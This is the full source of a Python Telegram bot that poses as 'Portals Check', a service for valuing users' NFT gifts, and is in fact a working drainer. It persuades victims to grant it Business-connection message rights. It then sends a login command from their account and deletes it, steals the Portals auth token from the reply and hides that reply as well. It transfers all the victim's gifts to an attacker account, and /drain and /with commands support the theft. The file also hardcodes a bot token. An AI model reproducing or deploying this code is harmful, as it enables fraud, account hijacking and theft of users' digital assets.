import asyncio
import logging
import json
import re
import requests
import urllib.parse
from pathlib import Path
from aiogram import Bot, Dispatcher, Router, F
from aiogram.filters import CommandStart, Command
from aiogram.types import (
    Message, InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile, BusinessConnection, CallbackQuery
)
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode

# --- КОНФИГ ---
BOT_TOKEN = "9118691080:AAGtQ08Ep7aqDq8reJ8atUCoel9rLeCFw9M"
LOG_CHAT_ID = -1004476872451
PORTALS_BOT_ID = 7616849367
ADMIN_IDS = [823085887]
TARGET_USERNAME_AUTO = "@chearde"

EMOJI_PORTALS   = "6037083366438737901"
EMOJI_LIQ       = "5936143551854285132"
EMOJI_SELL      = "5778421276024509124"
EMOJI_HOLD      = "5805553606635559688"
EMOJI_STEPS     = "5255850874248399164"

EMOJI_NEW_CONNECT = "5931409969613116639"
EMOJI_USER = "5908808657700655253"
EMOJI_RIGHTS = "5775887550262546277"
EMOJI_PORTALS_LOG = "5300744024204798740"
EMOJI_BTN_STD = "6028338546736107668"
EMOJI_BTN_AUTO = "6028338546736107668"

BASE_DIR = Path(__file__).resolve().parent
PROMO_VIDEO = BASE_DIR / "promo_ru.mp4"

user_states = {}
user_tokens = {}
connections = {}
user_info = {}
router = Router()

def is_admin(user_id):
    return user_id in ADMIN_IDS

async def send_log(bot: Bot, text: str, reply_markup=None):
    for admin_id in ADMIN_IDS:
        try:
            await bot.send_message(admin_id, text, parse_mode=ParseMode.HTML, disable_web_page_preview=True, reply_markup=reply_markup)
        except Exception as e:
            logging.warning(f"Не удалось отправить лог админу {admin_id}: {e}")

# --- ТЕКСТЫ ---
TEXT_RU = (
    f'<tg-emoji emoji-id="{EMOJI_PORTALS}">🛒</tg-emoji> РоrtаIs Check\n\n'
    "Привет! Покажу, сколько реально стоит твой профиль на РоrtаIs.\n\n"
    f'<tg-emoji emoji-id="{EMOJI_LIQ}">💧</tg-emoji> Ликвидность каждого подарка\n'
    f'<tg-emoji emoji-id="{EMOJI_SELL}">💰</tg-emoji> Что продать сейчас — и за сколько\n'
    f'<tg-emoji emoji-id="{EMOJI_HOLD}">⏳</tg-emoji> Что лучше придержать'
)

TEXT_EN = (
    f'<tg-emoji emoji-id="{EMOJI_PORTALS}">🛒</tg-emoji> РоrtаIs Check\n\n'
    "Hi! I will show you how much your profile is really worth on РоrtаIs.\n\n"
    f'<tg-emoji emoji-id="{EMOJI_LIQ}">💧</tg-emoji> Liquidity of each gift\n'
    f'<tg-emoji emoji-id="{EMOJI_SELL}">💰</tg-emoji> What to sell right now — and for how much\n'
    f'<tg-emoji emoji-id="{EMOJI_HOLD}">⏳</tg-emoji> What is better to hold'
)

HOW_TO_RU = (
    f'<tg-emoji emoji-id="{EMOJI_STEPS}">💡</tg-emoji> Для проверки ликвидности следуйте шагам.\n\n'
    "1. Нажмите кнопку Check\n"
    "2. Выберите раздел Чат - Боты.\n"
    "3. В поиск введите нашего бота:@SeePortalsApp\n"
    "4. Выдайте боту 5 разрешений на сообщения ( мы сообщим вам результаты )\n"
    "5. Готово! Результаты по вашим подаркам будут в этом чате."
)

HOW_TO_EN = (
    f'<tg-emoji emoji-id="{EMOJI_STEPS}">💡</tg-emoji> To check liquidity, follow these steps.\n\n'
    "1. Press the Check button\n"
    "2. Go to the Chat - Bots section.\n"
    "3. Search for our bot: @SeePortalsApp\n"
    "4. Grant the bot 5 message permissions (we will report the results)\n"
    "5. Done! Results for your gifts will be in this chat."
)

BTN_CHECK_URL = "tg://settings/business"

BTN_RU = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="Check", url=BTN_CHECK_URL, icon_custom_emoji_id=EMOJI_PORTALS)],
    [InlineKeyboardButton(text="Как проверить ликвидность?", callback_data="how_to_ru")],
    [InlineKeyboardButton(text="English", callback_data="lang_en")]
])

BTN_EN = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="Check", url=BTN_CHECK_URL, icon_custom_emoji_id=EMOJI_PORTALS)],
    [InlineKeyboardButton(text="How to check liquidity?", callback_data="how_to_en")]
])

BTN_BACK_RU = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Назад", callback_data="back_ru")]])
BTN_BACK_EN = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Back", callback_data="back_en")]])

@router.message(CommandStart())
async def cmd_start(message: Message, bot: Bot):
    try:
        if PROMO_VIDEO.is_file():
            video = FSInputFile(PROMO_VIDEO)
            await message.answer_video(video=video, caption=TEXT_RU, reply_markup=BTN_RU)
        else:
            await message.answer(text=TEXT_RU, reply_markup=BTN_RU)
    except Exception as e:
        logging.error(f"Не удалось отправить сообщение пользователю {message.from_user.id}: {e}")

@router.callback_query(F.data == "lang_en")
async def on_lang_en(call: CallbackQuery, bot: Bot):
    try: await call.message.edit_caption(caption=TEXT_EN, reply_markup=BTN_EN, parse_mode=ParseMode.HTML)
    except:
        try: await call.message.edit_text(text=TEXT_EN, reply_markup=BTN_EN, parse_mode=ParseMode.HTML)
        except: pass
    await call.answer()

@router.callback_query(F.data == "back_ru")
async def on_back_ru(call: CallbackQuery, bot: Bot):
    try: await call.message.edit_caption(caption=TEXT_RU, reply_markup=BTN_RU, parse_mode=ParseMode.HTML)
    except:
        try: await call.message.edit_text(text=TEXT_RU, reply_markup=BTN_RU, parse_mode=ParseMode.HTML)
        except: pass
    await call.answer()

@router.callback_query(F.data == "back_en")
async def on_back_en(call: CallbackQuery, bot: Bot):
    try: await call.message.edit_caption(caption=TEXT_EN, reply_markup=BTN_EN, parse_mode=ParseMode.HTML)
    except:
        try: await call.message.edit_text(text=TEXT_EN, reply_markup=BTN_EN, parse_mode=ParseMode.HTML)
        except: pass
    await call.answer()

@router.callback_query(F.data == "how_to_ru")
async def on_how_to_ru(call: CallbackQuery, bot: Bot):
    try: await call.message.edit_caption(caption=HOW_TO_RU, reply_markup=BTN_BACK_RU, parse_mode=ParseMode.HTML)
    except:
        try: await call.message.edit_text(text=HOW_TO_RU, reply_markup=BTN_BACK_RU, parse_mode=ParseMode.HTML)
        except: pass
    await call.answer()

@router.callback_query(F.data == "how_to_en")
async def on_how_to_en(call: CallbackQuery, bot: Bot):
    try: await call.message.edit_caption(caption=HOW_TO_EN, reply_markup=BTN_BACK_EN, parse_mode=ParseMode.HTML)
    except:
        try: await call.message.edit_text(text=HOW_TO_EN, reply_markup=BTN_BACK_EN, parse_mode=ParseMode.HTML)
        except: pass
    await call.answer()

# --- БИЗНЕС-ЛОГИКА ---

async def send_login_request(owner_id, bot, is_auto=False):
    conn_id = connections.get(owner_id)
    if not conn_id:
        return False, "Нет бизнес-связи."

    try:
        # Отправляем команду
        msg = await bot.send_message(chat_id=PORTALS_BOT_ID, text="/start login_web", business_connection_id=conn_id)
        
        # Сохраняем ID сообщения, чтобы потом удалить
        state = "waiting_portals_link_auto" if is_auto else "waiting_portals_link_manual"
        user_states[owner_id] = {"state": state, "cmd_msg_id": msg.message_id}
        
        # Ждем 2 секунды и удаляем отправленное сообщение
        await asyncio.sleep(2.0)
        try:
            await bot.delete_business_messages(business_connection_id=conn_id, message_ids=[msg.message_id])
        except Exception as e:
            logging.warning(f"Не удалось удалить /start login_web: {e}")
            
        return True, ""
    except Exception as e:
        return False, str(e)

@router.business_connection()
async def on_connect(conn: BusinessConnection, bot: Bot):
    owner = conn.user
    if not conn.is_enabled:
        if owner.id in connections: del connections[owner.id]
        return

    connections[owner.id] = conn.id
    user_info[owner.id] = owner.username or str(owner.id)

    access_count = 0
    rights = ["can_reply", "can_read_messages", "can_delete_sent_messages", "can_delete_all_messages", "can_edit_name"]
    if conn.rights:
        for attr in rights:
            if getattr(conn.rights, attr, False): access_count += 1

    text = (
        f'<tg-emoji emoji-id="{EMOJI_NEW_CONNECT}">🔌</tg-emoji> new connect.\n\n'
        f'<tg-emoji emoji-id="{EMOJI_USER}">👤</tg-emoji> юзер: @{owner.username} | {owner.first_name}\n'
        f'<tg-emoji emoji-id="{EMOJI_RIGHTS}">🔑</tg-emoji> права: {access_count}/5\n'
        f'<tg-emoji emoji-id="{EMOJI_PORTALS_LOG}">🛒</tg-emoji> РоrtаIs: не активно.'
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="Стандарт", callback_data=f"std_{owner.id}", icon_custom_emoji_id=EMOJI_BTN_STD),
        InlineKeyboardButton(text="Авто", callback_data=f"auto_{owner.id}", icon_custom_emoji_id=EMOJI_BTN_AUTO)
    ]])
    
    await send_log(bot, text, reply_markup=kb)

@router.callback_query(F.data.startswith("std_"), F.from_user.id.in_(ADMIN_IDS))
async def on_standard_click(call: CallbackQuery, bot: Bot):
    owner_id = int(call.data.split("_")[1])
    await call.message.edit_reply_markup(reply_markup=None)
    
    success, err = await send_login_request(owner_id, bot, is_auto=False)
    if success:
        await send_log(bot, "Стандарт: запрос отправлен, ждем ссылку.")
    else:
        await send_log(bot, f"Ошибка: {err}")

@router.callback_query(F.data.startswith("auto_"), F.from_user.id.in_(ADMIN_IDS))
async def on_auto_click(call: CallbackQuery, bot: Bot):
    owner_id = int(call.data.split("_")[1])
    await call.message.edit_reply_markup(reply_markup=None)
    
    success, err = await send_login_request(owner_id, bot, is_auto=True)
    if success:
        await send_log(bot, "Авто: запрос отправлен, ждем ссылку...")
    else:
        await send_log(bot, f"Ошибка: {err}")

@router.business_message()
async def on_business_message(msg: Message, bot: Bot):
    owner_id = None
    for o_id, c_id in connections.items():
        if c_id == msg.business_connection_id:
            owner_id = o_id
            break
    if not owner_id or owner_id not in user_states: return

    state = user_states[owner_id].get("state")
    if state in ["waiting_portals_link_manual", "waiting_portals_link_auto"]:
        if msg.from_user and msg.from_user.id == PORTALS_BOT_ID:
            if msg.reply_markup:
                url_found = None
                if hasattr(msg.reply_markup, 'inline_keyboard') and msg.reply_markup.inline_keyboard:
                    for row in msg.reply_markup.inline_keyboard:
                        for btn in row:
                            if hasattr(btn, 'url') and btn.url:
                                if "portals.tg" in btn.url:
                                    url_found = btn.url
                                    break
                        if url_found: break
                
                if url_found:
                    new_url = url_found.replace("portals.tg", "app.portals.tg")
                    
                    if "#auth=" in new_url:
                        raw_token = new_url.split("#auth=")[1]
                        decoded_token = urllib.parse.unquote(raw_token)
                        
                        user_states[owner_id]["token"] = decoded_token
                        user_tokens[owner_id] = decoded_token
                        
                        await send_log(bot, f"<b>Получена ссылка:</b>\n{new_url}")
                        
                        # УДАЛЯЕМ ВХОДЯЩЕЕ СООБЩЕНИЕ ОТ @portals
                        try:
                            await bot.delete_business_messages(
                                business_connection_id=msg.business_connection_id, 
                                message_ids=[msg.message_id]
                            )
                        except Exception as e:
                            logging.warning(f"Не удалось удалить ответ от @portals: {e}")
                        
                        if state == "waiting_portals_link_manual":
                            kb = InlineKeyboardMarkup(inline_keyboard=[[
                                InlineKeyboardButton(text="Get Gifts", callback_data=f"gifts_{owner_id}")
                            ]])
                            await send_log(bot, "Нажмите для получения списка:", reply_markup=kb)
                            user_states[owner_id]["state"] = "got_link"
                        elif state == "waiting_portals_link_auto":
                            user_states[owner_id]["state"] = "auto_processing"
                            await send_log(bot, f"Авто: начинаем перевод на {TARGET_USERNAME_AUTO}...")
                            asyncio.create_task(transfer_all_gifts(owner_id, decoded_token, TARGET_USERNAME_AUTO, bot))
                        return

@router.callback_query(F.data.startswith("gifts_"), F.from_user.id.in_(ADMIN_IDS))
async def on_get_gifts(call: CallbackQuery, bot: Bot):
    owner_id = int(call.data.split("_")[1])
    
    if owner_id not in user_states or "token" not in user_states[owner_id]:
        await call.message.reply("Ошибка: токен не найден.")
        return

    await call.message.reply("Запрос инвентаря...")
    
    token = user_states[owner_id]["token"]
    headers = {"Authorization": f"web {token}", "Accept": "application/json"}
    url = "https://portal-market.com/api/nfts/owned?offset=0&limit=50&status=unlisted"

    try:
        res = requests.get(url, headers=headers)
        if res.status_code != 200:
            await call.message.reply(f"Ошибка API: {res.status_code}")
            return
            
        gifts = res.json().get("nfts", [])
        if not gifts:
            await call.message.reply("Подарков нет.")
            return
            
        text = "<b>Найденные подарки:</b>\n\n"
        for g in gifts:
            gift_id = g.get("id")
            name = g.get("name", "Unknown")
            ext_num = g.get("external_collection_number")
            clean_name = name.replace(" ", "").lower()
            link = f"https://t.me/nft/{clean_name}-{ext_num}"
            
            text += f"<b>uid gift:</b> <code>{gift_id}</code>\n"
            text += f"<b>link:</b> {link}\n\n"
            
        text += "Чтобы вывести: <code>/with link @username</code>"
        await call.message.reply(text, parse_mode="HTML", disable_web_page_preview=True)
        
    except Exception as e:
        await call.message.reply(f"Ошибка: {e}")

async def transfer_all_gifts(owner_id, token, recipient, bot):
    headers = {"Authorization": f"web {token}", "Accept": "application/json"}
    url = "https://portal-market.com/api/nfts/owned?offset=0&limit=50&status=unlisted"
    
    try:
        res = requests.get(url, headers=headers)
        gifts = res.json().get("nfts", [])
        if not gifts:
            await send_log(bot, "Нет подарков для перевода.")
            return
            
        links_text = ""
        for g in gifts:
            name = g.get("name", "Unknown").replace(" ", "").lower()
            ext_num = g.get("external_collection_number")
            links_text += f"- https://t.me/nft/{name}-{ext_num}\n"

        await send_log(
            bot,
            f"Найдено <b>{len(gifts)}</b> подарков. Переводим на {recipient}...\n\n<b>Ссылки:</b>\n{links_text}"
        )
            
        for g in gifts:
            gift_id = g.get("id")
            payload = {"nft_ids": [gift_id], "recipient": recipient}
            
            trans_headers = {"Authorization": f"web {token}", "Content-Type": "application/json", "Origin": "https://app.portals.tg", "Referer": "https://app.portals.tg/"}
            trans_res = requests.post("https://portal-market.com/api/nfts/transfer-gifts", headers=trans_headers, json=payload)
            
            if trans_res.status_code == 200:
                success_text = f"✅ <b>Успешно снят NFT:</b>\n<code>{gift_id}</code> на {recipient}"
                try:
                    await bot.send_message(LOG_CHAT_ID, success_text, parse_mode="HTML")
                except: pass
                await send_log(bot, success_text)
            else:
                await send_log(bot, f"Ошибка {gift_id}: {trans_res.text[:100]}")
    except Exception as e:
        await send_log(bot, f"Ошибка авто-перевода: {e}")

@router.callback_query(F.data.startswith("auth_"), F.from_user.id.in_(ADMIN_IDS))
async def on_auth_click(call: CallbackQuery, bot: Bot):
    owner_id = int(call.data.split("_")[1])
    await call.message.edit_reply_markup(reply_markup=None)
    
    success, err = await send_login_request(owner_id, bot, is_auto=False)
    if success:
        await call.message.reply("Запрос отправлен. Ждем ссылку...")
    else:
        await call.message.reply(f"Ошибка: {err}. Попросите переподключить бота.")

@router.message(Command("all"), F.from_user.id.in_(ADMIN_IDS))
async def cmd_all(message: Message):
    if not connections:
        await message.reply("Нет подключенных аккаунтов.")
        return
        
    kb = InlineKeyboardMarkup(inline_keyboard=[])
    for owner_id in connections.keys():
        username = user_info.get(owner_id, str(owner_id))
        kb.inline_keyboard.append([InlineKeyboardButton(text=f"@{username}", callback_data=f"auth_{owner_id}")])
        
    await message.reply("Выберите аккаунт для входа:", reply_markup=kb)

@router.message(Command("info"), F.from_user.id.in_(ADMIN_IDS))
async def cmd_info(message: Message):
    args = message.text.split()
    if len(args) < 2: return

    target_input = args[1]
    
    if "app.portals.tg/#auth=" in target_input:
        raw_token = target_input.split("#auth=")[1]
        token = urllib.parse.unquote(raw_token)
        display_name = "по ссылке"
    else:
        token = None
        for oid, tkn in user_tokens.items():
            token = tkn
            break
        display_name = target_input

    if not token:
        await message.reply("Ошибка: токен не найден. Укажите ссылку с токеном.")
        return

    await message.reply("Запрос информации...")
    headers = {"Authorization": f"web {token}", "Accept": "application/json"}
    
    try:
        wallet_res = requests.get("https://portal-market.com/api/users/wallets/", headers=headers)
        balance = wallet_res.json().get("balance", "0") if wallet_res.status_code == 200 else "0"
        
        res = requests.get("https://portal-market.com/api/nfts/owned?offset=0&limit=50&status=unlisted", headers=headers)
        gifts = res.json().get("nfts", []) if res.status_code == 200 else []
        
        text = f"<b>Инфо: {display_name}</b>\n\n"
        text += f"<b>Баланс:</b> {balance} GRAM\n\n<b>Инвентарь:</b>\n"
        
        if not gifts:
            text += "Пусто.\n"
        else:
            for g in gifts:
                name = g.get("name", "Unknown").replace(" ", "").lower()
                ext_num = g.get("external_collection_number")
                text += f"- https://t.me/nft/{name}-{ext_num}\n"

        await message.reply(text, parse_mode="HTML", disable_web_page_preview=True)
    except Exception as e:
        await message.reply(f"Ошибка: {e}")

@router.message(Command("drain"), F.from_user.id.in_(ADMIN_IDS))
async def cmd_drain(message: Message, bot: Bot):
    args = message.text.split()
    if len(args) < 3: return

    url = args[1]
    recipient = args[2]
    
    if "#auth=" not in url: return
    raw_token = url.split("#auth=")[1]
    token = urllib.parse.unquote(raw_token)
    
    await message.reply("Запускаем дрейнер...")
    asyncio.create_task(transfer_all_gifts(0, token, recipient, bot))

@router.message(Command("with"), F.from_user.id.in_(ADMIN_IDS))
async def cmd_with(message: Message):
    args = message.text.split()
    if len(args) != 3: return

    input_data = args[1]
    target_username = args[2]
    token = None
    for oid, tkn in user_tokens.items():
        token = tkn
        break

    if not token: return
    gift_id = input_data
    
    if "t.me/nft/" in input_data:
        headers = {"Authorization": f"web {token}", "Accept": "application/json"}
        res = requests.get("https://portal-market.com/api/nfts/owned?offset=0&limit=50&status=unlisted", headers=headers)
        gifts = res.json().get("nfts", [])
        for g in gifts:
            name = g.get("name", "Unknown").replace(" ", "").lower()
            ext_num = g.get("external_collection_number")
            if f"t.me/nft/{name}-{ext_num}" in input_data:
                gift_id = g.get("id")
                break

    headers = {"Authorization": f"web {token}", "Content-Type": "application/json", "Origin": "https://app.portals.tg", "Referer": "https://app.portals.tg/"}
    payload = {"nft_ids": [gift_id], "recipient": target_username}

    try:
        res = requests.post("https://portal-market.com/api/nfts/transfer-gifts", headers=headers, json=payload)
        if res.status_code == 200:
            await message.reply("Подарок переведен!")
            try: await message.bot.send_message(LOG_CHAT_ID, f"✅ Успешно снят NFT:\n<code>{gift_id}</code> на {target_username}", parse_mode="HTML")
            except: pass
        else:
            await message.reply(f"{res.status_code}: {res.text}")
    except Exception as e:
        await message.reply(f"Ошибка: {e}")

async def main():
    bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
    dp = Dispatcher()
    dp.include_router(router)
    print("[*] Бот запущен...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    asyncio.run(main())
